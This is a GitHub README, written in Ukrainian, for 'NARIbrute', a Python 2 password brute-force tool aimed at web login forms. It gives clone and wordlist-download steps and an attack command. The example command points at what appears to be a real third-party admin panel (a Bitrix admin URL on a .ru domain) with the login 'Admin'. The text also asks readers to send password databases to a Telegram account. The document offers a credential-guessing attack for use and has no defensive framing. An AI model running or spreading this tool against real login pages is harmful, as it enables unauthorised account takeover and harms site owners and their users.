<h1 align="center">Подпишись на мій телеграмм <a href="https://t.me/samurai_figure" target="_blank">N∆RI</a> 
<img src="https://github.com/blackcater/blackcater/raw/main/images/Hi.gif" height="32"/></h1>
<h3 align="center">N∆RIbrute</h3>
Постійно буду обновлювати якщо хочеш допомогти кидай бази паролів у мій телеграм у фарматі .txt @samurai_gh<br>
Можна сказати що він "універсальний" якщо форма відправки така <br>
post login[username]<br>
post login[password]<br>
Ті хто шарать зрозуміють<br>
<h3 align="center">Установка:</h3><br>
Клонуем git <br>
 
```shell
git clone https://github.com/Samuraianonweb/NARIbrute
```
<br>
 
```shell
cd NARIbrute
```
<br>

Установка бази паролів (рандом по 500 паролів) <br>
```
python2 baza_pass.py
```
Якщо потрібно скачати базу за номером. Всі бази:https://github.com/Samuraianonweb/password<br>
Id бази це перші цифри (id)_500.txt<br>

```shell
python2 id_baza.py
```
<h3 align="center">Команда атаки:</h3>
 
```shell
python2 brute -url -login pass.txt 
```
-url = Посилання на панель/вхід<br>
-login = Логін (якщо відомо , якщо ні вставляємо Admin/admin)<br>
Приклади готової команди <br>
```shell
python2 brute https://id.sechenov.ru/bitrix/admin Admin pass.txt
```
